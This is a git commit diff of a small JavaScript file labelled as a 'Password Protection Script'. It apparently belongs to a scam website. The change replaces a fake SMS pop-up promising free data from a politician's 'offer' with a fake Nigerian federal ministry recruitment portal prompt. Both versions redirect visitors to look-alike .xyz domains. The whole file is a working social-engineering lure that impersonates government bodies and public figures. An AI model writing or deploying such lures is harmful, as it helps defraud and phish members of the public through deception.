42d0c5a8d7427990b8abc7cab64ed8bcc3956472
lagalfredben <lagalfredben@gmail.com>
2026-04-19 02:06:02 +0100

    Update backkey.js

--- backkey.js
+++ backkey.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = 'Recruitment'
+password=prompt('SMS: Welcome to the Federal Ministry of Youth Development Recruitment ePortal, Please press OK to continue. ','Recruitment');
+if (password != 'Recruitment') {
+location.href='https://fmyd-career.govserves.xyz/staff';
 }
